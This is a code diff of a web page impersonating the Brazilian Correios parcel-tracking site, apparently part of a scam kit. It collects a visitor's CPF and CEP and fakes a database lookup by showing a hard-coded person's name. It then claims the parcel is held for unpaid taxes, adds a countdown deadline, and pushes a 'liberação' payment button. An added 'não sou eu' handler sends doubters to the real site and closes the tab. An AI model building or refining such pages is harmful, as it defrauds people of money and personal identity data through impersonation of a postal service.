@@ -1,280 +1,399 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<meta http-equiv="X-UA-Compatible" content="ie=edge" />
-<title>Correios | Rastreio</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="stylesheet" href="css/bootstrap.css" />
+  <link rel="stylesheet" href="css/app.css" />
+  <link rel="stylesheet" href="css/yellow.css" />
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <title>Correios | Rastreio</title>
 
-<style>
-  /* Reset básico */
-  body, h1, h2, h5, p, ul, li, span, input, button, a {
-    margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif;
-  }
-  body {
-    background: #f4f4f4; color: #333;
-  }
-  a {
-    text-decoration: none; color: #0645ad; cursor: pointer;
-  }
-  a:hover {
-    text-decoration: underline;
-  }
+  <style>
+    /* ====== Top Bar amarela ====== */
+    #top-bar {
+      background-color: #ffd500;
+      height: 48px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 15px;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      color: #003157;
+      box-sizing: border-box;
+    }
 
-  /* Top bar amarela */
-  #top-bar {
-    background-color: #ffdb4d;
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 5px 20px;
-    font-size: 14px;
-  }
-  #top-bar a#acessibilidade {
-    color: #0645ad;
-  }
-  #top-bar button#btn-entrar {
-    background: none; border: none; font-weight: bold; cursor: pointer; color: #0645ad; display: flex; align-items: center;
-  }
-  #top-bar button#btn-entrar img {
-    margin-right: 5px;
-  }
-  #menu-hamburguer {
-    cursor: pointer;
-    display: flex; flex-direction: column; justify-content: space-around;
-    width: 22px; height: 18px;
-  }
-  #menu-hamburguer span {
-    background-color: #0645ad;
-    height: 3px;
-    border-radius: 2px;
-  }
+    #top-bar .left-options a {
+      color: #003157;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
 
-  /* Header logo */
-  header {
-    text-align: center;
-    padding: 20px 0;
-    background: white;
-  }
-  header img {
-    max-width: 200px;
-  }
+    #top-bar .left-options a:hover {
+      text-decoration: underline;
+    }
 
-  main {
-    max-width: 1000px;
-    margin: 20px auto;
-    background: white;
-    padding: 20px;
-    border-radius: 8px;
-  }
-  h1 {
-    color: #0645ad;
-    margin-bottom: 20px;
-  }
-  h2 {
-    color: #0645ad;
-    margin-bottom: 15px;
-  }
-  h5 {
-    color: #b77f0d;
-    margin-bottom: 10px;
-    font-weight: bold;
-  }
+    #top-bar .right-options {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
 
-  /* Formulário */
-  #tela-formulario span {
-    display: block;
-    margin: 10px 0 4px;
-    font-weight: 600;
-  }
-  #tela-formulario input {
-    width: 100%;
-    padding: 10px;
-    font-size: 16px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-  }
-  #botao-container {
-    margin-top: 15px;
-    text-align: center;
-  }
-  #consultar-btn {
-    background-color: #ffdb4d;
-    border: none;
-    padding: 12px 25px;
-    font-size: 16px;
-    font-weight: 700;
-    color: #0645ad;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  #consultar-btn:hover {
-    background-color: #e6c233;
-  }
+    #btn-entrar {
+      display: flex;
+      align-items: center;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
+      color: #003157;
+      font-weight: 600;
+      padding: 0;
+    }
 
-  /* Loading spinner */
-  .spinner {
-    border: 5px solid #f3f3f3;
-    border-top: 5px solid #0645ad;
-    border-radius: 50%;
-    width: 40px; height: 40px;
-    margin: 10px auto;
-    animation: spin 1s linear infinite;
-  }
-  @keyframes spin {
-    0% { transform: rotate(0deg);}
-    100% { transform: rotate(360deg);}
-  }
+    #btn-entrar img {
+      height: 20px;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
 
-  /* Tela resultado */
-  #resultado p {
-    margin: 6px 0;
-    font-size: 16px;
-  }
-  #resultado span:first-child {
-    font-weight: 700;
-    color: #555;
-  }
-  .btn-container {
-    margin-top: 20px;
-    display: flex;
-    justify-content: center;
-    gap: 15px;
-    align-items: center;
-  }
-  #btn-sim-sou-eu {
-    background-color: #0645ad;
-    color: white;
-    border: none;
-    padding: 12px 20px;
-    border-radius: 5px;
-    cursor: pointer;
-    font-weight: 700;
-    transition: background-color 0.3s ease;
-  }
-  #btn-sim-sou-eu:hover {
-    background-color: #043a7a;
-  }
-  #nao-sou-eu {
-    color: #0645ad;
-    cursor: pointer;
-    font-weight: 700;
-  }
-  #nao-sou-eu:hover {
-    text-decoration: underline;
-  }
+    #btn-entrar:hover {
+      text-decoration: underline;
+    }
 
-  /* Tela pagamento */
-  #pagamento {
-    font-size: 16px;
-  }
-  .breadcrumb {
-    list-style: none;
-    margin-bottom: 20px;
-    display: flex;
-    gap: 5px;
-    font-size: 14px;
-    color: #555;
-  }
-  .breadcrumb li::after {
-    content: ">";
-    margin-left: 5px;
-  }
-  .breadcrumb li:last-child::after {
-    content: "";
-  }
-  .breadcrumb li.active {
-    font-weight: 700;
-    color: #0645ad;
-  }
-  .alert-title {
-    font-size: 20px;
-    color: #a00;
-    font-weight: 700;
-    margin-bottom: 15px;
-  }
-  .status-label {
-    font-weight: 700;
-    margin-bottom: 5px;
-  }
-  .status-value {
-    font-size: 18px;
-    margin-bottom: 15px;
-  }
-  .normal-text {
-    margin-bottom: 10px;
-  }
-  #btn-pagar {
-    background-color: #ffdb4d;
-    border: none;
-    padding: 15px 30px;
-    font-weight: 700;
-    color: #0645ad;
-    border-radius: 6px;
-    cursor: pointer;
-    margin-bottom: 20px;
-    display: block;
-    margin-left: auto;
-    margin-right: auto;
-    font-size: 18px;
-  }
-  #btn-pagar:hover {
-    background-color: #e6c233;
-  }
-  #voltar-rastreio {
-    display: block;
-    text-align: center;
-    color: #0645ad;
-    font-weight: 700;
-    cursor: pointer;
-    margin-top: 10px;
-  }
-  #voltar-rastreio:hover {
-    text-decoration: underline;
-  }
+    #menu-hamburguer {
+      display: inline-block;
+      cursor: pointer;
+      width: 25px;
+      height: 18px;
+      position: relative;
+    }
 
-  /* Banner */
-  main > section.my-4 {
-    margin-top: 40px;
-  }
-  main > section.my-4 img {
-    width: 100%;
-    border-radius: 8px;
-  }
+    #menu-hamburguer span {
+      background: #003157;
+      position: absolute;
+      height: 3px;
+      width: 100%;
+      border-radius: 2px;
+      opacity: 1;
+      left: 0;
+      transition: all 0.3s ease;
+    }
 
-  /* Footer */
-  footer {
-    background-color: #ffdb4d;
-    color: #0645ad;
-    padding: 25px 15px;
-    text-align: center;
-  }
-  footer h5 {
-    font-weight: 700;
-    margin-bottom: 10px;
-  }
-  footer ul {
-    list-style: none;
-    padding: 0;
-    margin-bottom: 20px;
-  }
-  footer ul li {
-    margin-bottom: 8px;
-  }
-</style>
+    #menu-hamburguer span:nth-child(1) {
+      top: 0;
+    }
+
+    #menu-hamburguer span:nth-child(2) {
+      top: 7.5px;
+    }
+
+    #menu-hamburguer span:nth-child(3) {
+      top: 15px;
+    }
+
+    /* ====== Logo centralizada na horizontal e alinhada com botão consultar ====== */
+    header {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      position: relative;
+    }
+
+    header img {
+      height: 40px;
+      display: block;
+    }
+
+    main {
+      max-width: 700px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      color: #003157;
+    }
+
+    /* Centralizar o título Rastreamento */
+    main > h1 {
+      margin-bottom: 1.5rem;
+      font-weight: 700;
+      font-size: 24px;
+      color: #003157;
+    }
+
+    /* Texto "ACOMPANHE SUAS ENCOMENDAS ABAIXO" restaurado */
+    #tela-formulario h5 {
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #003157;
+      margin-bottom: 1.5rem;
+    }
+
+    /* Formulário com campos e botão centralizados */
+    #tela-formulario form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    #tela-formulario span {
+      color: #003157;
+      font-weight: 600;
+      align-self: flex-start;
+      max-width: 600px;
+      text-align: left;
+    }
+
+    /* Inputs centralizados e com largura fixa */
+    input.form-control {
+      max-width: 600px;
+      width: 100%;
+      margin-bottom: 0;
+    }
+
+    /* Botão centralizado */
+    #botao-container {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+      margin-top: 1rem;
+    }
+
+    #consultar-btn {
+      padding: 0.5rem 1.5rem;
+      font-size: 1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      animation: pulsar 1s infinite;
+      max-width: 600px;
+      width: 100%;
+    }
+
+    #consultar-btn:hover {
+      background-color: #0056b3;
+    }
+
+    @keyframes pulsar {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.1);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    /* Tela formulário background */
+    #tela-formulario {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    /* Resultado - removida a sombra */
+    #resultado {
+      background: #f0f0f0;
+      border-radius: 8px;
+      padding: 2rem;
+      font-family: Arial, sans-serif;
+      color: #003157;
+      /* box-shadow removido */
+      text-align: center;
+      max-width: 700px;
+      margin: 2rem auto;
+      display: none;
+    }
+
+    /* Pagamento - removida a sombra */
+    #pagamento {
+      background: #ffffff;
+      border-radius: 8px;
+      padding: 2rem;
+      font-family: Arial, sans-serif;
+      /* box-shadow removido */
+      text-align: center;
+      max-width: 700px;
+      margin: 2rem auto;
+      display: none;
+    }
+
+    #resultado h2, #pagamento h2 {
+      font-weight: 700;
+      margin-bottom: 1rem;
+      font-size: 14px;
+    }
+
+    #resultado p, #pagamento p {
+      font-size: 14px;
+      margin: 0.5rem 0;
+    }
+
+    #resultado p span, #pagamento p span {
+      font-weight: 700;
+      color: #007bff;
+    }
+
+    /* Alert styles */
+    .alert-title {
+      color: #dc3545;
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+    
+    .status-label {
+      color: #003157;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    
+    .status-value {
+      /* Adiciona emoji amarelo antes do texto */
+      color: #ffc107;
+      font-weight: bold;
+    }
+    
+    .normal-text {
+      color: #000000;
+      margin: 15px 0;
+    }
+
+    /* Rua e Bairro vazios */
+    #res-rua,
+    #res-bairro,
+    #pag-rua,
+    #pag-bairro {
+      color: transparent !important;
+      user-select: none;
+      pointer-events: none;
+    }
+
+    /* Prazo para regularização em vermelho */
+    #res-prazo {
+      font-size: 14px;
+      font-weight: 700;
+      color: red !important;
+    }
+
+    /* Botão sim sou eu */
+    #btn-sim-sou-eu, #btn-pagar {
+      margin-top: 1.5rem;
+      /* Botão mais fino: padding reduzido */
+      padding: 0.4rem 1rem;
+      font-size: 1.1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      display: inline-block;
+      max-width: 600px;
+      width: 100%;
+    }
+
+    #btn-sim-sou-eu:hover, #btn-pagar:hover {
+      background-color: #0056b3;
+    }
+
+    /* Container para alinhar botão e link */
+    #resultado .btn-container, #pagamento .btn-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1.5rem;
+    }
+
+    /* Link não sou eu abaixo do botão */
+    #nao-sou-eu, #voltar-rastreio {
+      color: gray;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 14px;
+      display: inline-block;
+    }
+
+    #nao-sou-eu:hover, #voltar-rastreio:hover {
+      color: #505050;
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(0, 0, 0, 0.1);
+      border-top-color: #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+    
+    /* Breadcrumb navigation */
+    .breadcrumb {
+      background-color: #e3f2fd;
+      padding: 8px 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    
+    .breadcrumb a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    
+    .breadcrumb a:hover {
+      text-decoration: underline;
+    }
+    
+    .breadcrumb .active {
+      color: #6c757d;
+    }
+    
+    .breadcrumb > li + li:before {
+      content: ">";
+      padding: 0 5px;
+      color: #6c757d;
+    }
+  </style>
 </head>
 
 <body>
-
-  <!-- Top Bar Amarela -->
+  <!-- Faixa amarela topo -->
   <div id="top-bar">
     <div class="left-options">
       <a href="#" id="acessibilidade">Acessibilidade</a>
     </div>
+
     <div class="right-options">
       <button id="btn-entrar" type="button">
-        <img src="images/entrar.svg" alt="Entrar" style="height:18px; margin-right:5px;"/>
+        <img src="images/entrar.svg" alt="Entrar" />
         Entrar
       </button>
+
       <div id="menu-hamburguer" aria-label="Menu">
         <span></span>
         <span></span>
@@ -283,7 +402,7 @@
     </div>
   </div>
 
-  <!-- Logo -->
+  <!-- Logo centralizada -->
   <header>
     <img src="images/correios.png" alt="Logo Correios" />
   </header>
@@ -316,7 +435,7 @@
     </section>
 
     <!-- Tela Resultado -->
-    <section id="resultado" style="display:none;">
+    <section id="resultado">
       <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
       <p><span>Nome:</span> <span id="res-nome"></span></p>
       <p><span>CPF:</span> <span id="res-cpf"></span></p>
@@ -335,7 +454,7 @@
     </section>
 
     <!-- Tela Pagamento -->
-    <section id="pagamento" style="display:none;">
+    <section id="pagamento">
       <ul class="breadcrumb">
         <li><a href="#">Portal Correios</a></li>
         <li class="active">Rastreamento</li>
@@ -344,12 +463,16 @@
       <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
       
       <div class="status-label">STATUS DA ENTREGA:</div>
+      <!-- Adicionado o emoji 🟡 antes da mensagem -->
       <div class="status-value">🟡 AGUARDANDO SUA CONFIRMAÇÃO</div>
       
+      <!-- Texto com cor azul claro -->
       <p class="normal-text" style="color: #add8e6;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
       <div class="btn-container">
+        <!-- Alterado o texto do botão e aplicado o estilo mais fino -->
         <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
         <p>Objeto aguardando sua confirmação</p>
         <p>em Unidade de Fiscalização em São Paulo</p>
@@ -366,149 +489,169 @@
     </section>
   </main>
 
-  <footer>
-    <div>
-      <h5>Fale Conosco</h5>
-      <ul>
-        <li>Registro de Manifestações</li>
-        <li>Central de Atendimento</li>
-        <li>Soluções para o seu negócio</li>
-        <li>Suporte ao cliente com contrato</li>
-        <li>Ouvidoria</li>
+  <footer class="d-flex flex-wrap justify-content-center px-5 py-4 bg-yellow text-blue-dark" style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;">
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Fale Conosco</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Registro de Manifestações</li>
+        <li class="mb-2">Central de Atendimento</li>
+        <li class="mb-2">Soluções para o seu negócio</li>
+        <li class="mb-2">Suporte ao cliente com contrato</li>
+        <li class="mb-2">Ouvidoria</li>
       </ul>
     </div>
-    <div>
-      <h5>Sobre Correios</h5>
-      <ul>
-        <li>Identidade corporativa</li>
-        <li>Educação e cultura</li>
-        <li>Código de ética</li>
-        <li>Transparência e prestação de contas</li>
-        <li>Política de Privacidade e Notas Legais</li>
+
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Sobre Correios</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Identidade corporativa</li>
+        <li class="mb-2">Educação e cultura</li>
+        <li class="mb-2">Código de ética</li>
+        <li class="mb-2">Transparência e prestação de contas</li>
+        <li class="mb-2">Política de Privacidade e Notas Legais</li>
       </ul>
     </div>
-    <div>
-      <h5>Outros Sites</h5>
-      <ul>
-        <li>Loja online dos Correios</li>
+
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Outros Sites</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Loja online dos Correios</li>
       </ul>
     </div>
-    <div>
+
+    <div class="w-100 text-center mt-3">
       <p>©️ Copyright 2025 Correios</p>
     </div>
   </footer>
 
-<script>
-  // Formatação CPF: 000.000.000-00
-  function formatarCPF(cpf) {
-    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-  }
-
-  // Formatação CEP: 00000-000
-  function formatarCEP(cep) {
-    return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
-  }
-
-  // Atualiza o prazo restante até o fim do dia
-  function atualizarContagemRegressiva() {
-    const agora = new Date();
-    const fimDoDia = new Date(
-      agora.getFullYear(),
-      agora.getMonth(),
-      agora.getDate(),
-      23, 59, 59
-    );
-
-    const diffMs = fimDoDia - agora;
-    const horas = Math.floor(diffMs / (1000 * 60 * 60));
-    const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
-    const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
-
-    return `${horas}h ${minutos}m ${segundos}s`;
-  }
-
-  // Controla a navegação das telas
-  function mostrarTela(telaId) {
-    document.getElementById("tela-formulario").style.display = "none";
-    document.getElementById("resultado").style.display = "none";
-    document.getElementById("pagamento").style.display = "none";
-
-    document.getElementById(telaId).style.display = "block";
-  }
-
-  document.getElementById("form-rastreamento").addEventListener("submit", function(event) {
-    event.preventDefault();
-
-    const cpfInput = document.getElementById("cpf");
-    const cepInput = document.getElementById("cep");
-    const loadingContainer = document.getElementById("loading-container");
-
-    // Remove tudo que não for número
-    let cpf = cpfInput.value.replace(/\D/g, "");
-    let cep = cepInput.value.replace(/\D/g, "");
-
-    if (cpf.length !== 11 || cep.length !== 8) {
-      alert("Por favor, insira um CPF e CEP válidos.");
-      return;
+  <script>
+    function formatarCPF(cpf) {
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
     }
 
-    // Mostra loading
-    loadingContainer.style.display = "block";
+    function formatarCEP(cep) {
+      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
+    }
 
-    setTimeout(() => {
-      loadingContainer.style.display = "none";
+    function atualizarContagemRegressiva() {
+      const agora = new Date();
+      const fimDoDia = new Date(
+        agora.getFullYear(),
+        agora.getMonth(),
+        agora.getDate(),
+        23,
+        59,
+        59
+      );
 
-      // Dados fixos para simular resposta da consulta
-      const dados = {
-        nome: "João Silva",
-        cpf: formatarCPF(cpf),
-        nascimento: "10/10/1985",
-        cep: formatarCEP(cep),
-        rua: "Rua das Flores",
-        bairro: "Centro",
-        cidade: "São Paulo",
-        estado: "SP",
-        prazo: atualizarContagemRegressiva()
-      };
+      const diffMs = fimDoDia - agora;
+      if (diffMs <= 0) {
+        document.getElementById("res-prazo").textContent = "Prazo expirado";
+        clearInterval(intervalContagem);
+        return;
+      }
 
-      // Preenche resultado
-      document.getElementById("res-nome").textContent = dados.nome;
-      document.getElementById("res-cpf").textContent = dados.cpf;
-      document.getElementById("res-nascimento").textContent = dados.nascimento;
-      document.getElementById("res-cep").textContent = dados.cep;
-      document.getElementById("res-rua").textContent = dados.rua;
-      document.getElementById("res-bairro").textContent = dados.bairro;
-      document.getElementById("res-cidade").textContent = dados.cidade;
-      document.getElementById("res-estado").textContent = dados.estado;
-      document.getElementById("res-prazo").textContent = dados.prazo;
+      const horas = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
 
-      mostrarTela("resultado");
-    }, 1500);
-  });
+      const dd = agora.getDate().toString().padStart(2, "0");
+      const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = agora.getFullYear();
 
-  // Botão "Sim sou eu"
-  document.getElementById("btn-sim-sou-eu").addEventListener("click", () => {
-    mostrarTela("pagamento");
-  });
+      document.getElementById(
+        "res-prazo"
+      ).textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas
+        .toString()
+        .padStart(2, "0")}:${minutos.toString().padStart(2, "0")}:${segundos
+        .toString()
+        .padStart(2, "0")})`;
+    }
 
-  // Link "não sou eu"
-  document.getElementById("nao-sou-eu").addEventListener("click", (event) => {
-    event.preventDefault();
-    mostrarTela("tela-formulario");
-  });
+    let intervalContagem;
 
-  // Botão pagamento
-  document.getElementById("btn-pagar").addEventListener("click", () => {
-    alert("Processo de pagamento iniciado.");
-    // Aqui pode implementar a lógica real de pagamento
-  });
+    document
+      .getElementById("form-rastreamento")
+      .addEventListener("submit", async function (event) {
+        event.preventDefault();
 
-  // Voltar para rastreamento
-  document.getElementById("voltar-rastreio").addEventListener("click", (event) => {
-    event.preventDefault();
-    mostrarTela("tela-formulario");
-  });
-</script>
+        const cpfInput = document.getElementById("cpf");
+        const cepInput = document.getElementById("cep");
 
+        const cpfRaw = cpfInput.value.replace(/\D/g, "");
+        const cepRaw = cepInput.value.replace(/\D/g, "");
+
+        if (!cpfRaw || cpfRaw.length !== 11) {
+          alert("Por favor, insira um CPF válido.");
+          return;
+        }
+
+        if (!cepRaw || cepRaw.length !== 8) {
+          alert("Por favor, insira um CEP válido.");
+          return;
+        }
+
+        document.getElementById("botao-container").style.display = "none";
+        document.getElementById("loading-container").style.display = "block";
+
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
+        const dadosPessoa = {
+          nome: "Rosiane Oliveira Da Silva",
+          cpf: formatarCPF(cpfRaw),
+          nascimento: "27/01/1985",
+          cep: formatarCEP(cepRaw),
+          rua: "Rua das Acácias",
+          bairro: "Centro",
+          cidade: "Porciúncula",
+          estado: "RJ",
+        };
+
+        document.getElementById("res-nome").textContent = dadosPessoa.nome;
+        document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+        document.getElementById("res-cep").textContent = dadosPessoa.cep;
+
+        // Deixa rua e bairro vazios
+        document.getElementById("res-rua").textContent = "";
+        document.getElementById("res-bairro").textContent = "";
+
+        document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+        document.getElementById("res-estado").textContent = dadosPessoa.estado;
+
+        document.getElementById("loading-container").style.display = "none";
+        document.getElementById("tela-formulario").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
+
+        atualizarContagemRegressiva();
+        intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
+      });
+
+    // Script para o botão "SIM SOU EU"
+    document.getElementById("btn-sim-sou-eu").addEventListener("click", function() {
+      document.getElementById("resultado").style.display = "none";
+      document.getElementById("pagamento").style.display = "block";
+    });
+
+    // Script para o link "não sou eu"
+    document.getElementById("nao-sou-eu").addEventListener("click", function (e) {
+      e.preventDefault();
+      window.open("https://www.correios.com.br/", "_blank");
+      window.close();
+    });
+    
+    // Script para o link "voltar ao rastreamento"
+    document.getElementById("voltar-rastreio").addEventListener("click", function(e) {
+      e.preventDefault();
+      document.getElementById("pagamento").style.display = "none";
+      document.getElementById("resultado").style.display = "block";
+    });
+    
+    // Script para o botão "Efetuar Pagamento" - agora com novo texto
+    document.getElementById("btn-pagar").addEventListener("click", function() {
+      alert("Redirecionando para página de pagamento...");
+      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
+    });
+  </script>
 </body>
 </html>
